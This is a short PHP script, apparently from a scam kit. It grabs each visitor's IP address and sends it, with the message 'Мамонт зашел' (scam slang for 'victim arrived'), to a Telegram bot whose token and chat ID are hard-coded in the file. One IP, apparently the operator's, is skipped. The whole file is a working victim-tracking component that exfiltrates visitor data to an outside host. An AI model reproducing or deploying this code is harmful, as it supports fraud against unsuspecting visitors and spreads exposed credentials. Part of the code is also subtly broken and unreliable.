<?php
{

    function getIp() {
        $keys = [
          'HTTP_CLIENT_IP',
          'HTTP_X_FORWARDED_FOR',
          'REMOTE_ADDR'
        ];
        foreach ($keys as $key) {
          if (!empty($_SERVER[$key])) {
            $ip = trim(end(explode(',', $_SERVER[$key])));         // ip парс
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
              return $ip;
            }
          }
        }
      }

      $ip = getIp();
      $text = "Мамонт зашел, ПОРШ: ".$ip;
      $text2 = "Коннект, IP: ".$ip;

      if($ip == "77.73.134.38"){
        fopen ("https://api.telegram.org/bot5882846732:AAH7gLFw6AvwFBp4b6weALBJO6FyFYJb_tY/sendMessage?chat_id=1650358777&parse_mode=html&text=","r"); //забей
    } else{
        fopen ("https://api.telegram.org/bot5882846732:AAH7gLFw6AvwFBp4b6weALBJO6FyFYJb_tY/sendMessage?chat_id=1650358777parse_mode=html&text={$text}","r"); //в тг 
    }


}
?>